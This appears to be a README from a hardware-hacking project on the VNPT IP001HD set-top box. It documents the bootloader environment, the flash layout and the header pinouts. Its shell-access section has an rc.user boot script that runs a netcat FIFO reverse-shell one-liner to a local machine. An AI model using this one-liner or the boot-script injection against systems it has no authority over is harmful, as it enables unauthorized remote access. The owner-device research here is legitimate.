# vnpt-ipe001hd
VNPT Igate set top box IP001HD

This repository contains data related to VNPT's IP001HD set-top box.
This box has a single core BCM7241 CPU running at 1305MHz along with 1GB DDR3-1866 and 3780MB of flash storage. The architecture is MIPS little endian.
Much of the info below can be obtained from the boot log.

## CFE 

Default environment:
```
CFE> printenv
Variable Name        Value
-------------------- --------------------------------------------------
        BOOT_CONSOLE uart0
 SPLASH_PART_STARTAD 228000
    SPLASH_PART_SIZE 400000
  LINUX_PART_STARTAD 628000
     LINUX_PART_SIZE 1000000
              SPLASH ENABLE
            ETH0_PHY INT
      ETH0_MDIO_MODE 1
          ETH0_SPEED 100
        ETH0_PHYADDR 1
            STARTUP0 boot -z -elf flash0.kernel: 'bmem=192M@64M bmem=512M@512M'
            STARTUP1 boot -z -elf flash0.recovery: 'bmem=192M@64M bmem=512M@512M'
            STARTUP2 sleep 1000 && boot -z -elf usbdisk0:vmlinuz-7429b0 'rootwait root=/dev/sda2 bmem=192M@64M bmem=512M@512M rw init=/init'
            BOOTMODE 0
            CFE_FUSE 11
         ETH0_HWADDR A0:65:18:8B:90:25
          STB_SERIAL 0122403S1F8B9025
         CHIP_SERIAL VNT0121S1F8B9025
            MTDPARTS
          DRAM0_SIZE 1024
          FLASH_TYPE EMMC
          FLASH_SIZE 3780
         CFE_VERSION 14.4
     CHIP_PRODUCT_ID 72410010
       CFE_BOARDNAME BCM97241USFF
      CFE_MEMORYSIZE 128
*** command status = 0

CFE> show devices
Device Name          Description
-------------------  ---------------------------------------------------------
              uart0  16550 DUART at 0xB0406700 channel 0
        flash0.rsv0  EMMC flash at 0000000000000000 offset 0000000000000000 size 32KB : emmc_part_DATA
      flash0.macadr  EMMC flash at 0000000000000000 offset 0000000000008000 size 64KB : emmc_part_DATA
       flash0.nvram  EMMC flash at 0000000000000000 offset 0000000000018000 size 64KB : emmc_part_DATA
        flash0.temp  EMMC flash at 0000000000000000 offset 0000000000028000 size 1024KB : emmc_part_DATA
     flash0.virtual  EMMC flash at 0000000000000000 offset 0000000000128000 size 1024KB : emmc_part_DATA
      flash0.splash  EMMC flash at 0000000000000000 offset 0000000000228000 size 4096KB : emmc_part_DATA
      flash0.kernel  EMMC flash at 0000000000000000 offset 0000000000628000 size 16384KB : emmc_part_DATA
    flash0.recovery  EMMC flash at 0000000000000000 offset 0000000001628000 size 16384KB : emmc_part_DATA
      flash0.system  EMMC flash at 0000000000000000 offset 0000000002628000 size 524288KB : emmc_part_DATA
       flash0.cache  EMMC flash at 0000000000000000 offset 0000000022628000 size 524288KB : emmc_part_DATA
        flash0.data  EMMC flash at 0000000000000000 offset 0000000042628000 size 2778944KB : emmc_part_DATA
        flash0.rsv1  EMMC flash at 0000000000000000 offset 00000000EBFF8000 size 32KB : emmc_part_DATA
         flash1.cfe  EMMC flash at 0000000000000000 offset 0000000000000000 size 1536KB : emmc_part_BOOT1
         flash2.cfe  EMMC flash at 0000000000000000 offset 0000000000000000 size 1536KB : emmc_part_BOOT2
               eth0  GENET Internal Ethernet at 0xB0700800
*** command status = 0

```
Some notes:
- The trick to append `init=/bin/sh` to `STARTUP` won't work.

## Getting shells

1. UART shell

UART shell can be accessed via J301 header with the following pins respectively: GND-RX-TX-VCC. However, I did not manage to proceed further than the CFE shell, as the Linux system requires logging in. To access the CFE shell, press Ctrl+C repeatedly when powering up the device.

2. System shell

In order to get to the system shell, some techniques need to be used. 

There is an unpopulated micro SD slot at J402 header. I initially thought it was the pinout of the flash chip, however by overlaying the images of the front and back of PCB and aligning the vias, I found out that it is not. The 7241 SoC has at least two SD/eMMC interfaces, one of the goes to the eMMC while the other goes to the header. An interesting note is that this SD card slot connects to the first SD/eMMC bus of the SoC (or at least first in the device tree used to compile the OS), thus getting the first number when enumerated (`mmcblk0` instead of `mmcblk1`). 

You can solder a micro sd slot directly to J402 as its pinout is very straightforward. But for extra clarity, here's the J402 header pinout (from left to right, respectively):
1. DAT1
2. DAT0
3. GND (VSS)
4. CLK
5. VCC (VDD)
6. CMD
7. DAT3
8. DAT2

This lefts the eMMC to the second node (mmcblk1). Booting up with a blank SD card reveals that unfortunately (fortunately for us), the system is hardcoded to use `mmcblk0` to mount /usr and /data. We also know the filesystem type of these two partitions are of ext4. Moreover, it tries to run a script named `rc.user` at the root of the `usr` partition.

With this knowledge, we will proceed to create two partitions on the card. The first partition will be named `usr` and the second partition will be named `data`. 

After creating the partitions, download Busybox for MIPS little endian (https://www.busybox.net/downloads/binaries/1.21.1/busybox-mipsel) and create a file named `rc.user` in root of `usr`. The `rc.user` file is a script that will be executed upon boot. We will use this opportunity to make it establish a reverse shell to our machine. Let's assume that our machine's address is 192.168.1.2.

The `rc.user` script needs to do at least these following things:
1. Copy busybox-mipsel to /bin: `cp busybox-mipsel /bin` because there is no `nc` utility in the box's stock `busybox`.
2. Softlink the nc utility: `ln -s /bin/busybox-mipsel /bin/nc`
3. (optional, if there is no DHCP) `ifconfig eth0 192.168.1.3`
4. Establish reverse shell: `rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.2 4242 >/tmp/f`

To have the system automatically reconnect without having to reboot when we mistakenly press Ctrl+C in the shell, it is good to put the 4th command in a infinite while loop.

That's it! Now our SD card contains the neccessary files to begin hacking the box. Pop it in the soldered sd slot, power the box on and wait for the shell.
